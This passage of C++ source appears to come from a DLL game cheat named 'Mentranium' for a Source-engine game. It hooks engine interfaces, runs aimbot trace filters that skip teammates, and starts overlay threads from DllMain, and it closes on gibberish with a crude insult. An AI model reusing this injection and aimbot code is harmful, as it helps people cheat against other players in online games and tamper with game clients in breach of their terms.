	LuaSharedDLLHandle = GetModuleHandle( "lua_shared.dll" );
	VguiDLLHandle	= GetModuleHandle( "vgui2.dll" );

	if ( !ClientDLLHandle || !EngineDLLHandle || !ServerDLLHandle ||!VguiDLLHandle )
	{
		Sleep(300);
		StartLoading();
		return 1;
	}

	dwClientDLLHandle = (DWORD)ClientDLLHandle;
	dwEngineDLLHandle = (DWORD)EngineDLLHandle;
	dwServerDLLHandle = (DWORD)ServerDLLHandle;
	dwVstdLibDLLHandle = (DWORD)VstdLibDLLHandle;
	dwLuaSharedDLLHandle = (DWORD)LuaSharedDLLHandle;
	dwVguiDLLHandle = (DWORD)VguiDLLHandle;

	clientFactory = (CreateInterfaceFn)GetProcAddress( ClientDLLHandle, "CreateInterface" );
	engineFactory = (CreateInterfaceFn)GetProcAddress( EngineDLLHandle, "CreateInterface" );
	serverFactory = (CreateInterfaceFn)GetProcAddress( ServerDLLHandle, "CreateInterface" );
	vstdLibFactory = (CreateInterfaceFn)GetProcAddress( VstdLibDLLHandle, "CreateInterface" );
	vguiLibFactory = (CreateInterfaceFn)GetProcAddress( VguiDLLHandle, "CreateInterface" );

	const char *has_Failed = NULL;

	if( !clientFactory || !engineFactory || !serverFactory )
	{
		has_Failed = "Could not get a factory";
		MessageBox( NULL, has_Failed, "grr", MB_OK );

		return 0;
	}

	// Hook required functions
	
	has_Failed = InitializeInterfaces();

	if ( has_Failed != 0 )
	{

		MessageBox( NULL, has_Failed, "grr", MB_OK );

		return 0;
	}

	g_pEngine->ClientCmd_Unrestricted("toggleconsole");


	g_pGlobals = g_pPlayerManager->GetGlobalVars();

	if ( !g_pGlobals )
	{
		MessageBox( NULL, "g_pGlobals == NULL", "Mentranium", MB_OK );
		return -1;
	}
	

	Sleep(1);
	ResumeThread(Thread2);
	ResumeThread(Thread3);
	ResumeThread(Thread4);

	return 0;
}

int CustomShouldHit( IHandleEntity* pEntityHandle, int contentsMask )
{

	IClientUnknown *punk = (IClientUnknown*)pEntityHandle;
	C_BaseEntity *clEnt = NULL;

	if ( !punk )
		return 1; // shouldnt happpen
	else
		clEnt = dynamic_cast<C_BaseEntity*>(punk);
	
	if ( !clEnt || clEnt->entindex() <1 )
		return 1; // worldspawn

	if ( pLocalEntity->entindex()== clEnt->entindex())
		return 0; // me

	if ( menu->M_Aim_TeamShoot )
	{

		if ( clEnt && IsAlive(clEnt) )
		{
			if ( isFriendlyTeam(clEnt) )
			{
				return 0;
			}
		}

	}

	return 1;
}

int CustomShouldHitAll( IHandleEntity* pEntityHandle, int contentsMask )
{

	IClientUnknown *punk = (IClientUnknown*)pEntityHandle;
	C_BaseEntity *clEnt = NULL;

	if ( !punk )
		return 1; // worldspawn
	else
		clEnt = dynamic_cast<C_BaseEntity*>(punk);

	if ( !clEnt || clEnt->entindex()< 1 )
		return 1; // worldspawn

	if ( pLocalEntity->entindex() == clEnt->entindex() )
		return 0; // me

	return 1;
}
bool bOnce = false;

BOOL WINAPI DllMain( HMODULE hInstDLL, DWORD reason, LPVOID lpReserved )
{

	if( reason == DLL_PROCESS_ATTACH )
	{
		if ( !bOnce )
			bOnce = true;
		else
			return 1;

		hInstDLLHandle = hInstDLL;
		DisableThreadLibraryCalls(hInstDLL);
		Thread1 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)StartLoading, NULL, CREATE_SUSPENDED, &dwThreadIdArray[90]);
		Thread2 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)D3DThread, NULL, CREATE_SUSPENDED, &dwThreadIdArray[89]);
		Thread3 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Mentranium_ThinkThread, NULL, CREATE_SUSPENDED, &dwThreadIdArray[88]);
		Thread4 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Mentranium_Initating, NULL, CREATE_SUSPENDED, &dwThreadIdArray[87]);
		Sleep(5);
		ResumeThread(Thread1);
		

		return true;
	}

	return 1;
}

//HAHAHAHAKISDKIWDKIKEFIKAGEGIT
//JDUASJDuAJSDuWJAJDUAJSDUJAW
//sDADWDEW
//"=§%$§429304349wiu4892i384384erui384ui3b84ui3bui4ew8ruj8beuR(UMTOHERÜFFEUCKER